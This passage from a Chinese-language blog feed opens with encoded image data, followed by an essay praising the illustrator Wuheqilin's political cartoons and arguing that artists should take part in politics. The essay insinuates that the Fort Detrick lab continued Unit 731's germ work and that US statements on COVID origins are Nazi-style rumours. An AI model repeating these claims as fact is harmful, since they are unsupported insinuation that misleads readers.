2cc+PFJLIy8KT5cVqrcpbLT03oX2yYup%0A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%0AYFQF2HHriiviCcqWxYbfTguPP8Ki3Fb2DItNbPaoKFLppx2qWEoFjLIjD5sE%0Acgg0rXubbH93cxXlut0CqXUWBMCfvj1/rQi9uh9uP5/Niuqla4YRLII7Br7T%0AT+yddk8Z52n6enpRh63/APZfn/O4svT6XwyvXGzeu4ncc4I7YpuRrAhqMfjJ%0AbqXKE87mAGf4ChJVuFbnyXFmbkeEzpOzbUVu359qje24LfZkhnO7a33s5wTj%0AP40WqAnYFPqmllHguGNuynJbfuI7eVBt3wK2q5K/qAWOB7qBhdWzff2eXofY%0A/pQrr3js1/PwK+rpdSW384/YWxdR3VqkdndatPHpEhxvMKy+Hz6EZHnkCqHF%0ANOUY7rlX/F8mXXTptfBiHqu/tLHUYrzpzqNJrhRkS2wZTg+TKw/TmrPRk2cX%0A9VVfz4MkXNb/AOxX4+k69A1xrHUEVpfx5IjltvDJOM5VkXb38jQUnBtOL/VP%0A/N/QLttV+z/n1F5ungO26nku0TJhuIzmRfofP6GrUk1t+BLae430TqO5iE0u%0An3V1FcugE6T2yPHPz3KtkZ96SWNOScufcdSTVIPW4sUgXWbPqWODUwxDWslu%0AVcZ47YKMP84qqrqM48fh9K/R0F+6ZPY6xp+owzvrur21lPgERGzMaSAf4TGM%0AA+xAHvTPHKNyggqa4YHLFZzWM80EhZcDasZ+8Ock57Y/n6VYmm1a3EcqTSex%0AWb/UOmukNFj1adrq+1udylrp8T4UHPDM2PpwPUc96Z22RJKmewf2juq9N0z+%0A7b/o+yFu6kDIlibH1JI/StK1M01twcyXhmLI3K3uyi6r19oetX73l/pupWbs%0Acn7PIkv8QtZIqjp0Wj4b/FXpbpTUI50bWWUH5lazjwQe/aT+VXYsnRKzNq9M%0As+Jwvca9b9UdDdZzyTaHq0cFw2WW1uoniZj3IVsbc+24ZqzPkhk3RXo8GXDD%0Aom064KPHK1rqEQViNjr2+v8A61kjaZrfA160vLeysr+K3mZobuGPYG55JR8j%0A07fpWmWzdcFKuSTfYyadjNPJK53uXZifx70g51YD/wBqdvLGKgQrP33zkn+l%0AAA/6TV0SecZBbCDHn5n+VB7seO25913Ju1N4k+6jCMfRRj+VBL1saT9CEsSB%0AVyRknzp6RWmwi2BMqjLgdzgmlcUOpM9mupoJDhiUBAII7VW4IdTYYiPcSQTR%0A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%0ABD//2Q==" alt="500"  /><center>《神明改造》</center>​    又是一个充满了深意的讽刺漫画，既然作品叫做《神明改造》第一个问题就来了：谁是神明？谁能改造神明？漫画下方的注释如此写到，I grant you a new corona。对于这个解法我更认为是字对字的直译，我授予你新冠。被牢牢锁在试验台上的巨人正是地球，地球就是这个讽刺漫画所指的神。<p>​    神明就是地球，但是地球的头部却被切开一片，露出了大脑内部组织。在这片裸露的区域上，有8个针管在往大脑中注射某种液体，这八个针管形成了一个王冠的形状。地球巨人的左手被四个巨大的金属环所固定，动弹不得。再看看，是什么钉住了这个巨人，这四个金属环上绘制的形象很明显，分别是：代表着金融霸权的美元，代表着军事霸权的F22战机，代表着科技霸权的芯片，代表着舆论霸权的推特！</p><p>​    改造又是何以？两个无头人，以及左侧福尔马林罐子中浸泡的头部的深意更是如此，两个无头人分别穿戴着纳粹德国和日本法西斯的军装，两个人分别对应的是日本731部队的石井四郎，与纳粹德国的戈培尔。 两个无头的怪胎，这正是美国在疫情期间的所作所为，积极攻击抹黑中国，消极抗疫。而右侧的无头人，向巨人正在用巨大的针头将研究的细菌病毒注射进地球巨人的身体之中。这也是至今为止的未解之谜，德赫里特堡病毒实验室，在战后继承了日本731部队的遗产究竟做了什么？</p><p>​    视线从画面内移出时间2021年7月31日，这个时间正是美国政府造谣指责武汉病毒实验室，推卸抗疫不力的时间。戈培尔的名言是：“谣言重复一千遍就成为了真理”。对于新冠溯源问题，美国正式在使用着德国纳粹的伎俩，一遍遍重复着那可笑的谣言，这也是这个作品所抨击的内容。</p><p>​    乌合麒麟，本名：付昱，代表作：《为弄臣加冕》、《至莫里森》、《伪神》、《剑来》、《敬呼吸》、《“和平之师”》。就像在与世界说中他所说的，他只是一个兴趣使然的画手，乌合麒麟认为传递和输出意识形态其实恰恰是艺术作品和艺术家的责任之一。所以他这么做了，而且是抱着抛砖引玉的态度，希望有更多的文艺工作者能善用自身技能去为祖国和人民做一些事情。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F.png" alt="1635418358508"></p><p>​    乌合麒麟在知乎上对自己有过如下评价，有的人在意舞台，有的人在意表演，所以你如果把我的作品简单理解成“绘画”那确实一般，画画好的人多了去了，上不封顶，我就是个在山脚下玩的开开心心的小学生，也从来没想过攀登绘画这座山峰最终走入殿堂。但是你要说你能从我画面中感受到一些共性的东西，它能够带给你一些最直接的触动，我觉得我已经做到了我想要做的，我所通过镜头、画面传递的这些东西，以及我对于创作形式的理念和所做出的探索在艺术的历史上能找到对标的人应该不多，所以它应该称不上是什么艺术形式，但是未来它会不会成为一种泛艺术形式的趋势？不得而知，拭目以待。</p><p>​    有人说艺术家不应该牵扯政治，我并不见得。用康德美学的观点来看，艺术与政治的联姻是肮脏的，画笔怎么能被指挥刀指挥呢？某种程度上来说，我们也不喜欢看那种为了专门为了逢迎宣传而制作的文化产品。</p><p>​    乌合麒麟的一副作品《和平之师》让我想到了，早在多年前看到的毕加索的《格尔尼卡》。《格尔尼卡》的意义也已经远远超越了艺术史层面，它同时也是世界上最著名的反战巨作。西班牙当代艺术家路易斯·戈迪略说，“毕加索画了一幅历史画，这幅画又变成了历史和传说”。《格尔尼卡》带给我的是一种震破耳膜的静默，而《和平之师》则是最凝重的悲哀。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/2.jpg" alt="img"></p><center>《格尔尼卡》</center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/10/28/%E4%B9%8C%E5%90%88%E9%BA%92%E9%BA%9F/%E5%92%8C%E5%B9%B3%E4%B9%8B%E5%B8%88.JPG" style="zoom: 17%;" /><center>《和平之师》</center>在评论中我看到这样一个评论，澳大利亚当局与纳粹有什么不同？答案是，纳粹重来没有要求毕加索为《格尔尼卡》道歉。<p>瑞典著名电影艺术家英格玛博格曼曾经说过：人们就如此被围在一个大圈里，彼此倾诉痛哭，但是没有任何一个人真的倾听别人在说什么。</p><p>如果说，在这样一个信息发达，又彼此意见分裂的社会中，艺术有什么用处，那么就是给予我们那些我们本应当知道却并不知道的感性认识。这就是艺术在当代的意义，我们需要一种语言，去链接隔阂的两端，以便重新审视我们内心，这不只是对某个议题的再认识，也是对作为观众的我们自己的再认识。</p><p>艺术家不应该躲避政治，艺术家应该主动参与政治，因为艺术是难以被曲解，被断章取义的。唯有艺术能使更多人唤起深刻的共鸣。</p>]]></content>
      
      
      <categories>
          
          <category> 个人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
